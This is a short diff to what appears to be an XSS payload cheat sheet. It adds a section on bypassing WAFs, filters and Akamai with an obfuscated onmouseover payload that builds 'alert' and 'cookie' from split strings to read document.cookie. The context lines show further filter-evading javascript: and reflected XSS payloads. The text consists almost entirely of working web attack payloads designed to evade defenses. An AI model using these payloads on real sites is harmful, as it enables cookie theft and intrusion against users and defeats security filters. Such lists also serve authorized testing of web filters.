@@ -153,6 +153,12 @@ can also work with single quotes (change it in the payload)
 javascript://%0dalert()
 javascript:/**/%0aalert()
 ```
+
+## Bypass XSS WAF, Filters and Akamai src,svg,autofocus,iframe,img,<>
+```js
+%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22
+```
+
 ## Reflected XSS
 ```js
 url=%26%2302java%26%23115cript:alert(document.domain)
